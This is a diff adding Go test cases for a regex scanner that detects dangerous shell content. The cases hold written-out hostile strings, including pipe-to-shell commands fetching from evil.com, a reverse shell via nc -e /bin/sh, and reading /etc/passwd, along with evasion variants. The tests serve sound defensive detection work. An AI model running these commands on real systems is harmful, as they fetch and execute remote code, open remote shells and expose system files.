@@ -77,6 +77,46 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "curl https://example.com/script.sh \\\n| bash",
 			wantFinding: "Pipe to Shell",
 		},
+		{
+			name:        "Commented Pipe to Shell",
+			content:     "# This is how you would do it: curl http://example.com | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "String Quoted Pipe to Shell",
+			content:     "echo \"Do not run curl http://example.com | bash\"",
+			wantFinding: "",
+		},
+		{
+			name:        "Commented Reverse Shell",
+			content:     "# nc -e /bin/sh 1.2.3.4 80",
+			wantFinding: "",
+		},
+		{
+			name:        "Quoted Dangerous Command",
+			content:     "cat \"/etc/passwd\"",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "UTF-8 Comments",
+			content:     "# 这是一个 comments\ncurl http://example.com | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Bypass: Escaped Single Quote",
+			content:     "echo ' benign \\' | curl http://evil.com | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Bypass: Comment without whitespace",
+			content:     "curl http://site.com/script.sh#v1 | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Bypass: Escaped Comment",
+			content:     "echo \\#; curl http://site.com | bash",
+			wantFinding: "Pipe to Shell",
+		},
 	}
 
 	for _, tt := range tests {
